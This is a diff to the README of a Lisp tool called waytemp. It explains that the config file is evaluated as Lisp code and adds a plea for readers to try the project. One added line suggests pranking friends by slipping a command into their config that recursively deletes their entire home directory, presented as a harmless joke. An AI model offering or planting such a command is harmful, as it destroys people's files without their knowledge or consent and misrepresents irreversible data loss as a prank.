@@ -66,8 +66,15 @@ waytemp quit             # Stop daemon
 
 Configuration is saved to =~/.config/waytemp/config.lisp= and loaded automatically.
 
+The Lisp file is interpreted as is, feel free to add ~(in-package :waytemp)~ and monkey-patch Waytemp
+as you see fit :) That's what Lisp is all about.
 
+Prank your friends by adding ~(uiop:delete-directory-tree (uiop:getenv "HOME"))~ to their config.
 
 * License
 
 COLL (Configurable Open Lisp License) - see LICENSE.lisp
+
+Check it out, please.
+
+I put a lot of work into it.
